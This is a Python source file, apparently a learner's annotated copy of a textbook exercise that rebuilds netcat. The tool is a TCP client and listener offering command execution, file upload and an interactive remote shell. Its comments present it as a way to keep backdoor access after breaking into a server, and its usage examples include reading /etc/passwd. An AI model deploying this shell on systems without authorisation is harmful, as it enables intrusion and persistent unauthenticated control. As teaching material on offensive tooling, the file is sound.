#WARNING netcat.py is still broken for some reason!!!
#replaces NetCat because it is mostly locked 

# With it, you can 
# read and write data across the network, meaning you can use it to execute 
# remote commands, pass files back and forth, or even open a remote shell. 
# On more than one occasion, we’ve run into servers that don’t have netcat installed 
# but do have Python. In these cases, it’s useful to create a simple network 
# client and server that you can use to push files, or a listener that gives you 
# command line access. If you’ve broken in through a web application, it’s 
# definitely worth dropping a Python callback to give you secondary access 
# without having to first burn one of your trojans or backdoors. Creating a tool 
# like this is also a great Python exercise, so let’s get started writing netcat.py:

#----------------------------------------------------------------

#-h, --help                     show this help message and exit
#-c, --command                  initialize a command shell
#-e EXECUTE, --execute EXECUTE  execute a specified command
#-l, --listen                   listen
#-p PORT, --port PORT           specified port
#-t TARGET, --target TARGET     specified IP
#-u UPLOAD, --upload UPLOAD     upload a file

#----------------------------------------------------------------

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT) 
    #1 #here we import all of our necessary libraries and set up the execute 
    # function, which receives a command, runs it, and returns the output as
    # a string.This function contains a new library we haven’t covered yet: the 
    # subprocesslibrary. This library provides a powerful process-creation inter
    # -face that gives you a number of ways to interact with client programs. In 
    # this case, we’re using its check_output method, which runs a command 
    # on the local operating system and then returns the output from that command.

    return output.decode()

#see here (skip to Main block to see code written before these lines)
class NetCat:
    def __init__(self, args, buffer=None): #1 # We initialize the NetCat object with the arguments from the command line and buffer...
            self.args = args        
            self.buffer = buffer 
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #2 # ...and then create the socket object
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self): # The run method, which is the entry point for managing the NetCat object, is pretty simple (lie): it delegates execution to two methods.
        if self.args.listen: # If we're setting up a listener, we call the listen method.
            self.listen()
        else:
            self.send() #4 # Otherwise we call the send method

#Now lets write the that send method:
    def send(self):
        self.socket.connect((self.args.target, self.args.port)) #1 # We connecto to the target port, and if we have a buffer, we send that to the target first.
        if self.buffer:
            self.socket.send(self.buffer)

        try: #2 # Then we set up a try/catch block so we can manually close the connection with CTRL-C. 
            while True: #3 # Next we start a loop to receive data from the target.
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break #4 # If there is no more data, we break out of the loop.
                if response:
                    print(response) # Otherwise, we print the response data and pause to get interactive input,...
                    buffer = input("> ")
                    buffer += '\n'
                    self.socket.send(buffer.encode()) #5 # ... send that input, and continue the looü
        except KeyboardInterrupt: #6 # The Loop will continue until the KeyboardInterrupt occurs (CTRL-C), which will close the socket
            print('User Terminated.')
            self.socket.close()
            sys.exit()
#Now let's write the method that executes when the program runs as a listener:

    def listen(self):
        self.socket.bind((self.args.target, self.args.port)) #1 # the listen method binds to the target and port...
        self.socket.listen(5) 
        while True: #2 # ...and starts listening in a Loop,
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread( #3 # passing the select socket to the handle method. 
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()

# Now let's implement the logic to perform file uploads, execute commands, adn create an interactive shell. The program can perform these Tasks when operating as a listener
    def handle(self, client_socket): # the handle metod executes the task corresponding to the command line argument it receives: execute a command, upload a file, or start a shell
        if self.args.execute: #1 # If a command should be executed, the handle method passes that command to the execute function...
            output = execute(self.args.execute)
            client_socket.send(output.encode()) # ... and sends the output back on the socket

        elif self.args.upload: #2 # If a file should be uploaded,
            file_buffer = b''
            while True: # ... we set up a loop to listen for content on the listening socket and receive data until there is no more data coming in. 
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer) # then we write that accumulated content to the specified file.
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
                
        elif self.args.command: #3 # Finally if a shell is to be created, we set up a loop, send a prompt to the sender, and wait for a command string to come back. We then execute the command using the execute function and return the output of the command to the sender.
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode(): # You will notice that the shell scans for a newline character to determine when to process a command which makes it netcat friendly. That is, you can use this program on the listener side and use netcat itself on the sender side. However, if you're conjuring up a Python client to speak to it, remember to add the newline character.
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode()) # in the send method, you can see we do add the newline character after we get input from the console.
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

# Now let’s create our main block responsible for handling command line 
# arguments and calling the rest of our functions:

if __name__ == "__main__":
    parser = argparse.ArgumentParser( #1 #We us the argparse module from the standard library to create a command line interface. After we will add arguments so it can be invoked to upload a file, execute a command, or start a command shell.
        description="BHP Net Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #2 ↓↓↓ # We provide example usage that the program will display when the user invokes it with "--help"...
        epilog=textwrap.dedent('''Example: 
        NetCat.py -t 192.168.1.108 -p 5555-l -c #command shell
        NetCat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
        NetCat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
        echo 'ABC' | ./NetCat.py -t 192.168.1.108 -p 135 # echo text to server port 135
        NetCat.py -t 192.168.1.108 -p 5555 # connect to server
    '''))
    #3 ...and add 6 arguments that specify how we want the program to behave.
    parser.add_argument('-c', '--command', action="store_true", help="command shell") # the -c argument sets up an interactive shell
    parser.add_argument('-e', '--execute', help='execute specified command') # the -e argument executes one specific command
    parser.add_argument('-l', '--listen', action='store_true', help='listen') # the -l argument indicates that a listener should be set up
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port') # the -p argument specifies the port on which to communicate
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP') # the -t argument specifies the target IP
    parser.add_argument('-u', '--upload', help='upload file') # the -u argument specifies the name of a file to upload
    # note: both the sender and the receiver can use this program, so the arguments define whether it's invoked to send or listen.
    # The -c, -e, and -u arguments imply the il argument, because those arguments apply to only the listener side of communication.
    # The Sender side makes the connection to the listener, and so it needs only the -t and -p arguments to define the target listener
    args = parser.parse_args()    
    if args.listen: #4 # If we're setting it up as a listener, we invoke the NetCat object with an empty buffer string..-
        buffer = '' # <- empty buffer string
    else:
        buffer = sys.stdin.read() # ...Otherwise, we send the buffer content from stdin.

nc = NetCat(args, buffer.encode())
nc.run() # Finally we call the run method to start it up. 

#Now let's start putting in the plumbing for some of these features, beginning with our client code.
#add the following code above the main block (see line 37)

